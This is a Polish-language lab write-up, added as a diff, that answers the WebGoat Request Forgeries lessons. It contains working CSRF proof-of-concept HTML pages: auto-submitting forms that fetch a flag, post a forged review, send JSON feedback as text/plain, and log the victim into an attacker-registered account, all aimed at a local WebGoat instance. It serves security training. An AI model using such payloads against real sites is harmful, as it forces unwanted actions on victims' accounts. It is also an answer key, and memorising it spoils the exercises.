@@ -1,0 +1,68 @@
+3. Klikamy Prześlij i wysyłamy zapytanie, następnie robimy własną stronę internetową z odwołaniem i otwieramy w przeglądarce (plik HTML):
+file:///C:/Users/cuqier/Desktop/WebGoat-odpowiedzi/(A82013) Request Forgeries/Test3.html
+
+<!DOCTYPE html>
+<html>
+<head>
+    <script>
+        function f() {
+            document.getElementById("form").submit();
+        }
+    </script>
+</head>
+
+<body onload="f()">
+    <form method="POST" id="form" action="http://localhost:8080/WebGoat/csrf/basic-get-flag">
+        <input type="hidden" name="csrf" value="true"/>
+    </form>
+</body>
+</html>
+
+4. Bardzo podobnie jak wcześniej, odświeżamy stronę i komentarze się pojawiają:
+file:///C:/Users/cuqier/Desktop/WebGoat-odpowiedzi/(A82013) Request Forgeries/Test4.html
+
+<!DOCTYPE html>
+<html>
+<head>
+</head>
+<body>
+    <form method="POST" id="form" action="http://localhost:8080/WebGoat/csrf/review">
+        <input type="hidden" name="reviewText" value="dawajnieidzdopracy"/>
+        <input type="hidden" name="stars" value="1"/>
+        <input type="hidden" name="validateReq" value="2aa14227b9a13d0bede0388a7fba9aa9"/>
+    </form>
+    <script>
+        document.getElementById("form").submit();
+    </script>
+</body>
+</html>
+
+7. Znowu podobna sytuacja, w tym wypadku jednak wystepuje JSON:
+file:///C:/Users/cuqier/Desktop/WebGoat-odpowiedzi/(A82013) Request Forgeries/Test7.html
+
+<!DOCTYPE html>
+<html>
+<head>
+</head>
+<body>
+    <form method="POST" id="form" enctype="text/plain" action="http://localhost:8080/WebGoat/csrf/feedback/message">
+    <input type="hidden" name='{"name":"WebGoat","email":"webgoat@webgoat.org","content":"WebGoatisthebest!!","1":"' value='"}'/>
+    </form>
+    <script>
+        document.getElementById("form").submit();
+    </script>
+</body>
+</html>
+
+8. Podobnie jak wcześniej, jednak musimy wpierw zarejestroważ użytkownika zaczynającego się od csrf-, nastepnię wykorzystujemy nasz HTML:
+file:///C:/Users/cuqier/Desktop/WebGoat-odpowiedzi/(A82013) Request Forgeries/Test8.html
+
+<!DOCTYPE html>
+<html>
+  <body onload=document.getElementById('login').submit()>
+    <form id="login" method="POST" action="http://localhost:8080/WebGoat/login">
+      <input id="username" name="username" value="csrf-webgoat" type="text">
+      <input id="password" name="password" value="webgoat" type="text">
+    </form> 
+  </body>
+</html>
